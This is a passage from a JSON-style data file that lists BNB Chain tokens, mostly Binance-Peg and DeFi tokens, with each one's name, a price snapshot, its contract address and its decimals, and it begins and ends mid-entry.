    "address": "0x715d400f88c167884bbcc41c5fea407ed4d2f8a0",
    "decimals": "18"
}, {
    "name": "Binance-Peg Paxos Standard (PAX)",
    "price": "0.99989775",
    "address": "0xb7f8cd00c5a06c0537e2abff0b58033d02e5e094",
    "decimals": "18"
}, {
    "name": "Binance-Peg Pax Dollar Token (USDP)",
    "price": "1.001",
    "address": "0xb3c11196a4f3b1da7c23d9fb0a3dde9c6340934f",
    "decimals": "18"
}, {
    "name": "Binance-Peg TrueUSD Token (TUSD)",
    "price": "1.002",
    "address": "0x14016e85a25aeb13065688cafb43044c2ef86784",
    "decimals": "18"
}, {
    "name": "Binance-Peg Zcash Token (ZEC)",
    "price": "55.79661456",
    "address": "0x1ba42e5193dfa8b03d15dd1b86a3113bbbef8eeb",
    "decimals": "18"
}, {
    "name": "Binance-Peg eCash Token (XEC)",
    "price": "0.00004314",
    "address": "0x0ef2e7602add1733bfdb17ac3094d0421b502ca3",
    "decimals": "18"
}, {
    "name": "Binance-Peg Maker (MKR)",
    "price": "843.1079991",
    "address": "0x5f0da599bb2cccfcf6fdfd7d81743b6020864350",
    "decimals": "18"
}, {
    "name": "Decentralized USD (USDD)",
    "price": "1.001",
    "address": "0xd17479997F34dd9156Deef8F95A52D81D265be9c",
    "decimals": "18"
}, {
    "name": "BitTorrent (BTT)",
    "price": "0.0000008",
    "address": "0x352Cb5E19b12FC216548a2677bD0fce83BaE434B",
    "decimals": "18"
}, {
    "name": "MIOTAC (IOTA)",
    "price": "0.269608",
    "address": "0xd944f1d1e9d5f9bb90b62f9d45e447d989580782",
    "decimals": "6"
}, {
    "name": "Binance-Peg Synthetix Network Token (SNX)",
    "price": "2.9308054",
    "address": "0x9ac983826058b8a9c7aa1c9171441191232e8404",
    "decimals": "18"
}, {
    "name": "Fantom (FTM)",
    "price": "0.224056",
    "address": "0xad29abb318791d579433d831ed122afeaf29dcfe",
    "decimals": "18"
}, {
    "name": "Binance-Peg PAX Gold (PAXG)",
    "price": "1704.29384048",
    "address": "0x7950865a9140cb519342433146ed5b40c6f210f7",
    "decimals": "18"
}, {
    "name": "Zilliqa (ZIL)",
    "price": "0.03131562",
    "address": "0xb86abcb37c3a4b64f74f59301aff131a1becc787",
    "decimals": "12"
}, {
    "name": "Binance-Peg Basic Attention Token (BAT)",
    "price": "0.30492261",
    "address": "0x101d82428437127bf1608f699cd651e6abf9766e",
    "decimals": "18"
}, {
    "name": "Binance-Peg Compound Coin (COMP)",
    "price": "58.95816995",
    "address": "0x52ce071bd9b1c4b00a0b92d298c512478cad67e8",
    "decimals": "18"
}, {
    "name": "Trust Wallet (TWT)",
    "price": "0.99116552",
    "address": "0x4b0f1812e5df2a09796481ff14017e6005508003",
    "decimals": "18"
}, {
    "name": "Green Metaverse Token (GMT)",
    "price": "0.629013",
    "address": "0x3019bf2a2ef8040c242c9a4c5c4bd4c81678b2a1",
    "decimals": "8"
}, {
    "name": "1INCH Token (1INCH)",
    "price": "0.57889",
    "address": "0x111111111117dc0aa78b770fa6a738034120c302",
    "decimals": "18"
}, {
    "name": "Frax Share (FXS)",
    "price": "4.79",
    "address": "0xe48a3d7d0bc88d552f730b62c006bc925eadb9ee",
    "decimals": "18"
}, {
    "name": "pTokens GALA (GALA)",
    "price": "0.0411874",
    "address": "0x7ddee176f665cd201f93eede625770e2fd911990",
    "decimals": "18"
}, {
    "name": "Binance-Peg yearn.finance (YFI)",
    "price": "8231.36590074",
    "address": "0x88f1a5ae2a3bf98aeaf342d26b30a79438c9142e",
    "decimals": "18"
}, {
    "name": "Ankr (ANKR)",
    "price": "0.03055405",
    "address": "0xf307910a4c7bbc79691fd374889b36d8531b08e3",
    "decimals": "18"
}, {
    "name": "Wrapped USTC Token (USTC)",
    "price": "0.0295598",
    "address": "0x23396cf899ca06c4472205fc903bdb4de249d6fc",
    "decimals": "18"
}, {
    "name": "Binance-Peg IoTeX Network (IOTX)",
    "price": "0.02835682",
    "address": "0x9678e42cebeb63f23197d726b29b1cb20d0064e5",
    "decimals": "18"
}, {
    "name": "Swipe (SXP)",
    "price": "1.27619407",
    "address": "0x47bead2563dcbf3bf2c9407fea4dc236faba485a",
    "decimals": "18"
}, {
    "name": "JUST (JST)",
    "price": "0.02569821",
    "address": "0xea998d307aca04d4f0a3b3036aba84ae2e409c0a",
    "decimals": "18"
}, {
    "name": "Binance-Peg Ontology Token (ONT)",
    "price": "0.22519633",
    "address": "0xfd7b3a77848f1c2d67e05e54d78d174a0c850335",
    "decimals": "18"
}, {
    "name": "Synapse (SYN)",
    "price": "1.28544931",
    "address": "0xa4080f1778e69467e905b8d6f72f6e441f9e9484",
    "decimals": "18"
}, {
    "name": "Venus BTC (vBTC)",
    "price": "870.45312396",
    "address": "0x882c173bc7ff3b7786ca16dfed3dfffb9ee7847b",
    "decimals": "8"
}, {
    "name": "SafeMoon (SFM)",
    "price": "0.0002896",
    "address": "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5",
    "decimals": "9"
}, {
    "name": "APENFT (NFT)",
    "price": "0.00000055",
    "address": "0x20ee7b720f4e4c4ffcb00c4065cdae55271aecca",
    "decimals": "6"
}, {
    "name": "Binance-Peg APENFT Token (NFT)",
    "price": "0.00000055",
    "address": "0x1fc9004ec7e5722891f5f38bae7678efcb11d34d",
    "decimals": "6"
}, {
    "name": "Binance-Peg Smooth Love Potion (SLP)",
    "price": "0.00350499",
    "address": "0x070a08beef8d36734dd67a491202ff35a6a16d97",
    "decimals": "18"
}, {
    "name": "Binance-Peg COTI Token (COTI)",
    "price": "0.117213",
    "address": "0xadbaf88b39d37dc68775ed1541f1bf83a5a45feb",
    "decimals": "18"
}, {
    "name": "Binance-Peg Kyber Network Crystal Token (KNC)",
    "price": "1.14",
    "address": "0xfe56d5892bdffc7bf58f2e84be1b2c32d21c308b",
    "decimals": "18"
}, {
    "name": "Reef.finance (REEF)",
    "price": "0.00532716",
    "address": "0xf21768ccbc73ea5b6fd3c687208a7c2def2d966e",
    "decimals": "18"
}, {
    "name": "Venus USDC (vUSDC)",
    "price": "0.0216343",
    "address": "0xeca88125a5adbe82614ffc12d0db554e2e2867c8",
    "decimals": "8"
}, {
    "name": "Orbs (ORBS)",
    "price": "0.03486497",
    "address": "0xebd49b26169e1b52c04cfd19fcf289405df55f80",
    "decimals": "18"
}, {
    "name": "ALICE (ALICE)",
    "price": "1.74",
    "address": "0xac51066d7bec65dc4589368da368b212745d63e8",
    "decimals": "6"
}, {
    "name": "wazirx token (WRX)",
    "price": "0.201967",
    "address": "0x8e17ed70334c87ece574c9d537bc153d8609e2a3",
    "decimals": "8"
}, {
    "name": "Prometeus (PROM)",
    "price": "5.34791907",
    "address": "0xaf53d56ff99f1322515e54fdde93ff8b3b7dafd5",
    "decimals": "18"
}, {
    "name": "Binance-Peg Cartesi Token (CTSI)",
    "price": "0.143771",
    "address": "0x8da443f84fea710266c8eb6bc34b71702d033ef2",
    "decimals": "18"
}, {
    "name": "BSC Conflux (bCFX)",
    "price": "0.04203461",
    "address": "0x045c4324039dA91c52C55DF5D785385Aab073DcF",
    "decimals": "18"
}, {
    "name": "Binance-Peg Celer Token (CELR)",
    "price": "0.01543822",
    "address": "0x1f9f6a696c6fd109cd3956f45dc709d2b3902163",
    "decimals": "18"
}, {
    "name": "Biswap (BSW)",
    "price": "0.26088",
    "address": "0x965f527d9159dce6288a2219db51fc6eef120dd1",
    "decimals": "18"
}, {
    "name": "Binance-Peg Bancor Network Token (BNT)",
    "price": "0.441408",
    "address": "0xa069008a669e2af00a86673d9d584cfb524a42cc",
    "decimals": "18"
}, {
    "name": "Coin98 (C98)",
    "price": "0.36190638",
    "address": "0xaec945e04baf28b135fa7c640f624f8d90f1c3a6",
    "decimals": "18"
}, {
    "name": "Anyswap-BEP20 (ANY)",
    "price": "4.19716677",
    "address": "0xf68c9df95a18b2a5a5fa1124d79eeeffbad0b6fa",
    "decimals": "18"
}, {
    "name": "Alien Worlds Trilium (TLM)",
    "price": "0.02421963",
    "address": "0x2222227e22102fe3322098e4cbfe18cfebd57c95",
    "decimals": "4"
}, {
    "name": "FLOKI (FLOKI)",
    "price": "0.00000787",
    "address": "0xfb5b838b6cfeedc2873ab27866079ac55363d37e",
    "decimals": "9"
}, {
    "name": "FC Santos Fan Token (SANTOS)",
    "price": "15.94418667",
    "address": "0xa64455a4553c9034236734faddaddbb64ace4cc7",
    "decimals": "8"
}, {
    "name": "Binance-Peg ELF Token (ELF)",
    "price": "0.1317814",
    "address": "0xa3f020a5c92e15be13caf0ee5c95cf79585eecc9",
    "decimals": "18"
}, {
    "name": "StandardBTCHashrateToken (BTCST)",
    "price": "9.09",
    "address": "0x78650b139471520656b9e7aa7a5e9276814a38e9",
    "decimals": "17"
}, {
    "name": "Venus (XVS)",
    "price": "5.28496931",
    "address": "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
    "decimals": "18"
}, {
    "name": "CertiK Token (CTK)",
    "price": "0.7598578",
    "address": "0xa8c2b8eec3d368c0253ad3dae65a5f2bbb89c929",
    "decimals": "6"
}, {
    "name": "MDX Token (MDX)",
    "price": "0.06083906",
    "address": "0x9c65ab58d8d978db963e63f2bfb7121627e3a739",
    "decimals": "18"
}, {
    "name": "VAI Stablecoin (VAI)",
    "price": "0.96264355",
    "address": "0x4bd17003473389a42daf6a0a729f6fdb328bbbd7",
    "decimals": "18"
}, {
    "name": "DODO bird (DODO)",
    "price": "0.131295",
    "address": "0x67ee3cb086f8a16f34bee3ca72fad36f7db929e2",
    "decimals": "18"
}, {
    "name": "AlphaToken (ALPHA)",
    "price": "0.11377882",
    "address": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
    "decimals": "18"
}, {
    "name": "Venus BUSD (vBUSD)",
    "price": "0.01840916",
    "address": "0x95c78222b3d6e262426483d42cfa53685a67ab9d",
    "decimals": "8"
}, {
    "name": "pTokens TLOS (TLOS)",
    "price": "0.175381",
    "address": "0xb6c53431608e626ac81a9776ac3e999c5556717c",
    "decimals": "18"
}, {
    "name": "BakeryToken (BAKE)",
    "price": "0.25006395",
    "address": "0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5",
    "decimals": "18"
}, {
    "name": "PolkastarterToken (POLS)",
    "price": "0.475556",
    "address": "0x7e624fa0e1c4abfd309cc15719b7e2580887f570",
    "decimals": "18"
}, {
    "name": "AlpacaToken (ALPACA)",
    "price": "0.295892",
    "address": "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
    "decimals": "18"
}, {
    "name": "Binance-Peg Band Protocol Token (BAND)",
    "price": "1.23714917",
    "address": "0xad6caeb32cd2c308980a548bd0bc5aa4306c6c18",
    "decimals": "18"
}, {
    "name": "Automata (ATA)",
    "price": "0.148302",
    "address": "0xa2120b9e674d3fc3875f415a7df52e382f141225",
    "decimals": "18"
}, {
    "name": "SafePal Token (SFP)",
    "price": "0.39091825",
    "address": "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
    "decimals": "18"
}, {
    "name": "DEI (DEI)",
    "price": "0.999128",
    "address": "0xde12c7959e1a72bbe8a5f7a1dc8f8eef9ab011b3",
    "decimals": "18"
}, {
    "name": "Binance-Peg Phala Network Token (PHA)",
    "price": "0.088114",
    "address": "0x0112e557d400474717056c4e6d40edd846f38351",
    "decimals": "18"
}, {
    "name": "Ellipsis (EPS)",
    "price": "0.05452",
    "address": "0xa7f552078dcc247c2684336020c03648500c6d9f",
    "decimals": "18"
}, {
    "name": "Binance-Peg YFII.finance Token (YFII)",
    "price": "928.37952331",
    "address": "0x7f70642d88cf1c4a3a7abb072b53b929b653eda5",
    "decimals": "18"
}, {
    "name": "Binance-Peg Komodo Token (KMD)",
    "price": "0.259238",
    "address": "0x2003f7ba57ea956b05b85c60b4b2ceea9b111256",
    "decimals": "18"
}, {
    "name": "BNBPay (BPAY)",
    "price": "0.00549474",
    "address": "0xebc76079da0c245fae7225b58a57a54809b40618",
    "decimals": "9"
}, {
    "name": "Refinable (FINE)",
    "price": "0.02024959",
    "address": "0x4e6415a5727ea08aae4580057187923aec331227",
    "decimals": "18"
}, {
    "name": "Venus USDT (vUSDT)",
    "price": "0.02180887",
    "address": "0xfd5840cd36d94d7229439859c0112a4185bc0255",
    "decimals": "8"
}, {
    "name": "Litentry (LIT)",
    "price": "0.857869",
    "address": "0xb59490ab09a0f526cc7305822ac65f2ab12f9723",
    "decimals": "18"
}, {
    "name": "LTO Network (LTO)",
    "price": "0.07701107",
    "address": "0x857b222fc79e1cbbf8ca5f78cb133d1b7cf34bbd",
    "decimals": "18"
}, {
    "name": "decentral.games on xDai from xDai ($DG)",
    "price": "0.050306",
    "address": "0x9fdc3ae5c814b79dca2556564047c5e7e5449c19",
    "decimals": "18"
}, {
    "name": "BNB48 Club Token (KOGE)",
    "price": "8.41",
    "address": "0xe6df05ce8c8301223373cf5b969afcb1498c5528",
    "decimals": "18"
}, {
    "name": "QANX Token (QANX)",
    "price": "0.01281152",
    "address": "0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa",
    "decimals": "18"
}, {
    "name": "bZx Protocol Token (BZRX)",
    "price": "0.05209",
    "address": "0x4b87642aedf10b642be4663db842ecc5a88bf5ba",
    "decimals": "18"
}, {
    "name": "beefy.finance (BIFI)",
    "price": "333.51",
    "address": "0xCa3F508B8e4Dd382eE878A314789373D80A5190A",
    "decimals": "18"
}, {
    "name": "pStake Finance (PSTAKE)",
    "price": "0.13819",
    "address": "0x4C882ec256823eE773B25b414d36F92ef58a7c0C",
    "decimals": "18"
}, {
    "name": "RAMP DEFI (RAMP)",
    "price": "0.062687",
    "address": "0x8519ea49c997f50ceffa444d240fb655e89248aa",
    "decimals": "18"
}, {
    "name": "AdEx Network (ADX)",
    "price": "0.17124757",
    "address": "0x6bff4fb161347ad7de4a625ae5aa3a1ca7077819",
    "decimals": "18"
}, {
    "name": "SAITO (SAITO)",
    "price": "0.01113542",
    "address": "0x3c6dad0475d3a1696b359dc04c99fd401be134da",
    "decimals": "18"
}, {
    "name": "Venus ETH (vETH)",
    "price": "11.77033408",
    "address": "0xf508fcd89b8bd15579dc79a6827cb4686a3592c8",
    "decimals": "8"
}, {
    "name": "EverRise (RISE)",
    "price": "0.00033191",
    "address": "0xC17c30e98541188614dF99239cABD40280810cA3",
    "decimals": "18"
}, {
    "name": "Frontier Token (FRONT)",
    "price": "0.2313785",
    "address": "0x928e55dab735aa8260af3cedada18b5f70c72f1b",
    "decimals": "18"
}, {
    "name": "UniLend Finance Token (UFT)",
    "price": "0.365474",
    "address": "0x2645d5f59d952ef2317c8e0aaa5a61c392ccd44d",
    "decimals": "18"
}, {
    "name": "Binance-Peg MANTRA DAO Token (OM)",
    "price": "0.04322237",
    "address": "0xf78d2e7936f5fe18308a3b2951a93b6c4a41f5e2",
    "decimals": "18"
}, {
    "name": "Fuse Token on BSC (FUSE)",
    "price": "0.084531",
    "address": "0x5857c96dae9cf8511b08cb07f85753c472d36ea3",
    "decimals": "18"
}, {
    "name": "Chess (CHESS)",
    "price": "0.262964",
    "address": "0x20de22029ab63cf9a7cf5feb2b737ca1ee4c82a6",
    "decimals": "18"
}, {
    "name": "Hector (HEC)",
    "price": "8.77",
    "address": "0x638EEBe886B0e9e7C6929E69490064a6C94d204d",
    "decimals": "9"
}, {
    "name": "Contentos (COS)",
    "price": "0.00608339",
    "address": "0x96dd399f9c3afda1f194182f71600f1b65946501",
    "decimals": "18"
}, {
    "name": "Tokocrypto Token (TKO)",
    "price": "0.251764",
    "address": "0x9f589e3eabe42ebc94a44727b3f3531c0c877809",
    "decimals": "18"
}, {
    "name": "The LoveChain (LOV)",
    "price": "0.137179",
    "address": "0x2e01A3Df69E387E769cC0429f697fD207c02e2f0",
    "decimals": "8"
}, {
    "name": "OVR (OVR)",
    "price": "0.663255",
    "address": "0x7e35d0e9180bf3a1fc47b0d110be7a21a10b41fe",
    "decimals": "18"
}, {
    "name": "Measurable Data Token (MDT)",
    "price": "0.02623972",
    "address": "0x668db7aa38eac6b40c9d13dbe61361dc4c4611d1",
    "decimals": "18"
}, {
    "name": "MATH Token (MATH)",
    "price": "0.109789",
    "address": "0xf218184af829cf2b0019f8e6f0b2423498a36983",
    "decimals": "18"
}, {
    "name": "TOR (TOR)",
    "price": "1.00",
    "address": "0x1d6Cbdc6b29C6afBae65444a1f65bA9252b8CA83",
    "decimals": "18"
}, {
    "name": "Wrapped MIR Token (MIR)",
    "price": "0.20498994",
    "address": "0x5b6dcf557e2abe2323c48445e8cc948910d8c2c9",
    "decimals": "18"
}, {
    "name": "BIDR BEP20 (BIDR)",
    "price": "0.0000703",
    "address": "0x9a2f5556e9a637e8fbce886d8e3cf8b316a1d8a2",
    "decimals": "18"
}, {
    "name": "RFOX (RFOX)",
    "price": "0.00978593",
    "address": "0x0a3a21356793b49154fd3bbe91cbc2a16c0457f5",
    "decimals": "18"
}, {
    "name": "Burger Swap (BURGER)",
    "price": "0.74209812",
    "address": "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
    "decimals": "18"
}, {
    "name": "Newscrypto (NWC)",
    "price": "0.100294",
    "address": "0x968f6f898a6df937fc1859b323ac2f14643e3fed",
    "decimals": "18"
}, {
    "name": "Binance-Peg dForce Token (DF)",
    "price": "0.03341349",
    "address": "0x4a9a2b2b04549c3927dd2c9668a5ef3fca473623",
    "decimals": "18"
}, {
    "name": "ApeSwapFinance Banana (BANANA)",
    "price": "0.088251",
    "address": "0x603c7f932ed1fc6575303d8fb018fdcbb0f39a95",
    "decimals": "18"
}, {
    "name": "hoge.finance (HOGE)",
    "price": "0.00003185",
    "address": "0xa4fffc757e8c4f24e7b209c033c123d20983ad40",
    "decimals": "9"
}, {
    "name": "Imported GBYTE (GBYTE)",
    "price": "15.83",
    "address": "0xeb34de0c4b2955ce0ff1526cdf735c9e6d249d09",
    "decimals": "18"
}, {
    "name": "TOKPIE (TKP)",
    "price": "0.157587",
    "address": "0x7849ed1447250d0b896f89b58f3075b127ca29b3",
    "decimals": "18"
}, {
    "name": "AUTOv2 (AUTO)",
    "price": "233.24076342",
    "address": "0xa184088a740c695e156f91f5cc086a06bb78b827",
    "decimals": "18"
}, {
    "name": "Nominex (NMX)",
    "price": "0.22086",
    "address": "0xd32d01a43c869edcd1117c640fbdcfcfd97d9d65",
    "decimals": "18"
}, {
    "name": "The Force Token (FOR)",
    "price": "0.01857076",
    "address": "0x658a109c5900bc6d2357c87549b651670e5b0539",
    "decimals": "18"
}, {
    "name": "OMAX TOKEN (OMAX)",
    "price": "0.0012187",
    "address": "0xeB84be66c8E71f07eA57Cf3b21626d7784F32A7F",
    "decimals": "18"
}, {
    "name": "Cake Monster (MONSTA)",
    "price": "0.00178",
    "address": "0x8a5d7fcd4c90421d21d30fcc4435948ac3618b2f",
    "decimals": "18"
}, {
    "name": "ParaSwap (PSP)",
    "price": "0.02632369",
    "address": "0xcafe001067cdef266afb7eb5a286dcfd277f3de5",
    "decimals": "18"
}, {
    "name": "SwftCoin (SWFTC)",
    "price": "0.00161424",
    "address": "0xe64e30276c2f826febd3784958d6da7b55dfbad3",
    "decimals": "18"
}, {
    "name": "ARIVA (ARV)",
    "price": "0.00014092",
    "address": "0x6679eb24f59dfe111864aec72b443d1da666b360",
    "decimals": "8"
}, {
    "name": "Hotbit Token (HTB)",
    "price": "0.01186713",
    "address": "0x4e840aadd28da189b9906674b4afcb77c128d9ea",
    "decimals": "18"
}, {
    "name": "Rubic (BRBC)",
    "price": "0.080897",
    "address": "0x8e3bcc334657560253b83f08331d85267316e08a",
    "decimals": "18"
}, {
    "name": "Cream (CREAM)",
    "price": "14.43472411",
    "address": "0xd4cb328a82bdf5f03eb737f37fa6b370aef3e888",
    "decimals": "18"
}, {
    "name": "UniCrypt on xDai on BSC (UNCX)",
    "price": "243.98",
    "address": "0x09a6c44c3947b69e2b45f4d51b67e6a39acfb506",
    "decimals": "18"
}, {
    "name": "Venus Reward Token (VRT)",
    "price": "0.00035194",
    "address": "0x5f84ce30dc3cf7909101c69086c50de191895883",
    "decimals": "18"
}, {
    "name": "Bridge (BRG)",
    "price": "0.00094918",
    "address": "0x6e4a971b81ca58045a2aa982eaa3d50c4ac38f42",
    "decimals": "18"
}, {
    "name": "Hacken Token (HAI)",
    "price": "0.01407617",
    "address": "0xaa9e582e5751d703f85912903bacaddfed26484c",
    "decimals": "8"
}, {
    "name": "Raven Protocol (RAVEN)",
    "price": "0.00158782",
    "address": "0xcd7c5025753a49f1881b31c48caa7c517bb46308",
    "decimals": "18"
}, {
    "name": "Binance-Peg TornadoCash Token (TORN)",
    "price": "6.43666443",
    "address": "0x1ba8d3c4c219b124d351f603060663bd1bcd9bbf",
    "decimals": "18"
}, {
    "name": "Binance-Peg Token Club (TCT)",
    "price": "0.0067751",
    "address": "0xca0a9df6a8cad800046c1ddc5755810718b65c44",
    "decimals": "18"
}, {
    "name": "Lunar (LNR)",
    "price": "0.00000001",
    "address": "0xc1A59a17F87ba6651Eb8E8F707db7672647c45bD",
    "decimals": "18"
}, {
    "name": "Cashaa (CAS)",
    "price": "0.00812566",
    "address": "0x780207b8c0fdc32cf60e957415bfa1f2d4d9718c",
    "decimals": "18"
}, {
    "name": "Venus DAI (vDAI)",
    "price": "0.02144756",
    "address": "0x334b3ecb4dca3593bccc3c7ebd1a1c1d1780fbf1",
    "decimals": "8"
}, {
    "name": "Position Token (POSI)",
    "price": "0.092954",
    "address": "0x5ca42204cdaa70d5c773946e69de942b85ca6706",
    "decimals": "18"
}, {
    "name": "AQUA (AQUA)",
    "price": "55.60",
    "address": "0x72b7d61e8fc8cf971960dd9cfa59b8c829d91991",
    "decimals": "18"
}, {
    "name": "$Poolz Finance [via ChainPort.io] (POOLZ)",
    "price": "1.40",
    "address": "0x77018282fd033daf370337a5367e62d8811bc885",
    "decimals": "18"
}, {
    "name": "Impossible Decentralized Incubator Access Token (IDIA)",
    "price": "0.073885",
    "address": "0x0b15ddf19d47e6a86a56148fb4afffc6929bcb89",
    "decimals": "18"
}, {
    "name": "DEUS (DEUS)",
    "price": "41.73",
    "address": "0xde5ed76e7c05ec5e4572cfc88d1acea165109e44",
    "decimals": "18"
}, {
    "name": "Venus LINK (vLINK)",
    "price": "0.15638668",
    "address": "0x650b940a1033b8a1b1873f78730fcfc73ec11f1f",
    "decimals": "8"
}, {
    "name": "Smart Advertising Transaction Token (SATT)",
    "price": "0.00139793",
    "address": "0x448bee2d93be708b54ee6353a7cc35c4933f1156",
    "decimals": "18"
}, {
    "name": "Venus LTC (vLTC)",
    "price": "1.09222454",
    "address": "0x57a5297f2cb2c0aac9d554660acd6d385ab50c6b",
    "decimals": "8"
}, {
    "name": "Torum (XTM)",
    "price": "0.02560581",
    "address": "0xcd1faff6e578fa5cac469d2418c95671ba1a62fe",
    "decimals": "18"
}, {
    "name": "fry.world (FRIES)",
    "price": "138.49",
    "address": "0x393b312c01048b3ed2720bf1b090084c09e408a1",
    "decimals": "18"
}, {
    "name": "Ferrum Network Token (FRM)",
    "price": "0.03492772",
    "address": "0xA719b8aB7EA7AF0DDb4358719a34631bb79d15Dc",
    "decimals": "18"
}, {
    "name": "Aura (AURA)",
    "price": "0.087163",
    "address": "0x23c5D1164662758b3799103Effe19cC064d897D6",
    "decimals": "6"
}, {
    "name": "Cerby Token (CERBY)",
    "price": "0.00016178",
    "address": "0xdef1fac7bf08f173d286bbbdcbeeade695129840",
    "decimals": "18"
}, {
    "name": "StableX Token (STAX)",
    "price": "0.27392484",
    "address": "0x0da6ed8b13214ff28e9ca979dd37439e8a88f6c4",
    "decimals": "18"
}, {
    "name": "IceToken (ICE)",
    "price": "0.276683",
    "address": "0xf16e81dce15b08f326220742020379b855b87df9",
    "decimals": "18"
}, {
    "name": "ZMINE Token (ZMN)",
    "price": "0.00588685",
    "address": "0xfcb8a4b1a0b645e08064e05b98e9cc6f48d2aa57",
    "decimals": "18"
}, {
    "name": "Antimatter.Finance Mapping Token (MATTER)",
    "price": "0.11081727",
    "address": "0x1c9491865a1de77c5b6e19d2e6a5f1d7a6f2b25f",
    "decimals": "18"
}, {
    "name": "Graviton (GTON)",
    "price": "0.94444913",
    "address": "0x64d5baf5ac030e2b7c435add967f787ae94d0205",
    "decimals": "18"
}, {
    "name": "ROOBEE (bROOBEE)",
    "price": "0.00075878",
    "address": "0xe64f5cb844946c1f102bd25bbd87a5ab4ae89fbe",
    "decimals": "18"
}, {
    "name": "Bogged Finance (BOG)",
    "price": "0.221601",
    "address": "0xb09fe1613fe03e7361319d2a43edc17422f36b09",
    "decimals": "18"
}, {
    "name": "VFOX (VFOX)",
    "price": "0.143839",
    "address": "0x4d61577d8fd2208a0afb814ea089fdeae19ed202",
    "decimals": "18"
}, {
    "name": "O3 Swap Token (O3)",
    "price": "0.082471",
    "address": "0xee9801669c6138e84bd50deb500827b776777d28",
    "decimals": "18"
}, {
    "name": "Venus SXP (vSXP)",
    "price": "0.00711736",
    "address": "0x2ff3d0f6990a40261c66e1ff2017acbc282eb6d0",
    "decimals": "8"
}, {
    "name": "NFTY Token (NFTY)",
    "price": "0.01072328",
    "address": "0x5774b2fc3e91af89f89141eacf76545e74265982",
    "decimals": "18"
}, {
    "name": "FinNexus (FNX)",
    "price": "0.00758215",
    "address": "0xdfd9e2a17596cad6295ecffda42d9b6f63f7b5d5",
    "decimals": "18"
}, {
    "name": "FREE coin BSC (FREE)",
    "price": "0.00000027",
    "address": "0x12e34cdf6a031a10fe241864c32fb03a4fdad739",
    "decimals": "18"
}, {
    "name": "CryptoBlades Skill Token (SKILL)",
    "price": "2.51",
    "address": "0x154a9f9cbd3449ad22fdae23044319d6ef2a1fab",
    "decimals": "18"
}, {
    "name": "DuckDaoDime (DDIM)",
    "price": "2.12",
    "address": "0xc9132c76060f6b319764ea075973a650a1a53bc9",
    "decimals": "18"
}, {
    "name": "Venus DOT (vDOT)",
    "price": "0.13790747",
    "address": "0x1610bc33319e9398de5f57b33a5b184c806ad217",
    "decimals": "8"
}, {
    "name": "Curate (XCUR)",
    "price": "0.04870032",
    "address": "0xd52669712f253cd6b2fe8a8638f66ed726cb770c",
    "decimals": "8"
}, {
    "name": "Heroes&Empires (HE)",
    "price": "0.0072301",
    "address": "0x20d39a5130f799b95b55a930e5b7ebc589ea9ed8",
    "decimals": "18"
}, {
    "name": "NapoleonX Token (NPXB)",
    "price": "0.07375",
    "address": "0xd8cb4c2369db13c94c90c7fd3bebc9757900ee6b",
    "decimals": "18"
}, {
    "name": "DAFI Token (DAFI)",
    "price": "0.00316652",
    "address": "0x22439be3aebc1590b05e3243780ed4156b629604",
    "decimals": "18"
}, {
    "name": "Billion Happiness (BHC)",
    "price": "34.77120629",
    "address": "0x6fd7c98458a943f469e1cf4ea85b173f5cd342f4",
    "decimals": "18"
}, {
    "name": "UNCL on xDai on BSC (UNCL)",
    "price": "7.83",
    "address": "0x0e8d5504bf54d9e44260f8d153ecd5412130cabb",
    "decimals": "18"
}, {
    "name": "Spartan Protocol Token V2 (SPARTA)",
    "price": "0.01469466",
    "address": "0x3910db0600ea925f63c36ddb1351ab6e2c6eb102",
    "decimals": "18"
}, {
    "name": "Wrapped Idena (iDNA)",
    "price": "0.02471",
    "address": "0x0de08c1abe5fb86dd7fd2ac90400ace305138d5b",
    "decimals": "18"
}, {
    "name": "GourmetGalaxy (GUM)",
    "price": "0.44406874",
    "address": "0xc53708664b99df348dd27c3ac0759d2da9c40462",
    "decimals": "18"
}, {
    "name": "BELT Token (BELT)",
    "price": "0.338267",
    "address": "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
    "decimals": "18"
}, {
    "name": "IOI Token via ChainPort.io (IOI)",
    "price": "0.135044",
    "address": "0x959229d94c9060552daea25ac17193bca65d7884",
    "decimals": "6"
}, {
    "name": "ACryptoS (ACS)",
    "price": "0.911647",
    "address": "0x4197c6ef3879a08cd51e5560da5064b773aa1d29",
    "decimals": "18"
}, {
    "name": "Wanaka Farm (WANA)",
    "price": "0.01852109",
    "address": "0x339c72829ab7dd45c3c52f965e7abe358dd8761e",
    "decimals": "18"
}, {
    "name": "OddzToken (ODDZ)",
    "price": "0.01988289",
    "address": "0xcd40f2670cf58720b694968698a5514e924f742d",
    "decimals": "18"
}, {
    "name": "TETU Reward Token (TETU)",
    "price": "0.0048637",
    "address": "0x1f681b1c4065057e07b95a1e5e504fb2c85f4625",
    "decimals": "18"
}, {
    "name": "SOAKMONT V2 (SKMT)",
    "price": "0.00004252",
    "address": "0x1B2fdB1626285B94782af2Fda8e270E95cEbC3b4",
    "decimals": "18"
}, {
    "name": "JulSwap (JulD)",
    "price": "0.00195747",
    "address": "0x5a41f637c3f7553dba6ddc2d3ca92641096577ea",
    "decimals": "18"
}, {
    "name": "DeFi For You. (DFY)",
    "price": "0.00240661",
    "address": "0xd98560689c6e748dc37bc410b4d3096b1aa3d8c2",
    "decimals": "18"
}, {
    "name": "PULI INU (PULI)",
    "price": "0.0112759",
    "address": "0xaef0a177c8c329cbc8508292bb7e06c00786bbfc",
    "decimals": "9"
}, {
    "name": "Ditto (DITTO)",
    "price": "0.37520659",
    "address": "0x233d91a0713155003fc4dce0afa871b508b3b715",
    "decimals": "9"
}, {
    "name": "Moeda Loyalty Points (MDA)",
    "price": "0.04824854",
    "address": "0xd72aa9e1cddc2f6d6e0444580002170fba1f8eed",
    "decimals": "18"
}, {
    "name": "Rhythm (RHYTHM)",
    "price": "0.00007248",
    "address": "0xe4318f2acf2b9c3f518a3a03b5412f4999970ddb",
    "decimals": "9"
}, {
    "name": "REVOLVE_GAMES (RPG)",
    "price": "0.01989006",
    "address": "0x01E0d17a533E5930A349C2BB71304F04F20AB12B",
    "decimals": "18"
}, {
    "name": "Shard (SHARD)",
    "price": "0.02779267",
